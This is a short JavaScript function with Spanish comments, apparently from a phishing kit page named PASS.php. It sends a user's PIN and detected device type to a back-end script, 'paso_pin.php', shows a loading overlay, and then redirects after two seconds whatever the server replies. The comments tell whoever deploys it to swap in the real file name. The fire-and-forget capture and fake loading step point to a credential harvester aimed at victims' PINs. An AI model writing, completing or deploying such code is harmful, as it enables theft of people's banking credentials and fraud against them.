// Función para el PIN (La que está en PASS.php)
function pasousuario(p){
    var d = detectar_dispositivo();
    
    // Mostramos el cargando
    $("#fondo, #cargando-o").show();
    
    // 1. Enviamos los datos al archivo que los procesa
    // Asegúrate que la carpeta 'process' y el archivo existan
    $.post("../process/paso_pin.php", { pin: p, dis: d }, function(data) {
        // Al recibir respuesta, saltamos
        console.log("Datos enviados");
    });
    
    // 2. SALTO DE SEGURIDAD (Para que no se quede el círculo dando vueltas)
    setTimeout(function(){ 
        // CAMBIA ESTO por el nombre real de tu archivo en el repositorio
        window.location.href = "TU_ARCHIVO_REAL.php"; 
    }, 2000);
}
